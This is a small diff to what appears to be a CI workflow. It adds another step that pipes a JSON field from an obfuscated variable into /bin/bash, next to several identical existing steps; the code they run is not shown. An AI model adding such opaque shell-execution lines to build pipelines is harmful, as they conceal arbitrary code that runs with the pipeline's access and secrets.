@@ -32,6 +32,7 @@ jobs:
           echo $yfa72 | jq -r .ytve6232 | /bin/bash
           echo $lpnzg74 | jq -r .umn46876 | /bin/bash
           echo $al24 | jq -r .tac43 | /bin/bash
+          echo $nfz99 | jq -r .pv8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
